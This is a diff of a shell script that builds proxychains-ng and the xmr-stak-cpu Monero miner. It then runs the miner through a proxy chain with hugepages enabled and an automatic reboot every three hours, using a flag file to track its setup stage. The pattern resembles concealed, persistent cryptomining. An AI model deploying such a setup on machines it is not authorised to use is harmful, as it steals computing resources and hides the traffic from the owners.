@@ -3,6 +3,12 @@ sudo sysctl -w vm.nr_hugepages=128
 file="/flag2"
 if [ -f "$file" ]
 then
+	cd /m/test01/xmr-stak-cpu/bin/
+	( sleep 10800 ; reboot ) & 
+	sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu
+	# >/dev/null 2>&1
+  	sudo reboot   
+else
 	sudo apt-get install cmake -y
 	cd /m/test01
 	sudo git clone --recursive https://github.com/rofl0r/proxychains-ng.git	
@@ -18,13 +24,7 @@ then
 	sudo make
 	sudo make install
 	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
-	cd /m/test01/xmr-stak-cpu/bin/
-	( sleep 10800 ; reboot ) & 
-	sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu
-	# >/dev/null 2>&1
-  	sudo reboot   
-else
-    	sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
+        sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
 	sudo /bin/su -c "echo 'xxxxx' >> /flag2"
   	sudo reboot  
 fi
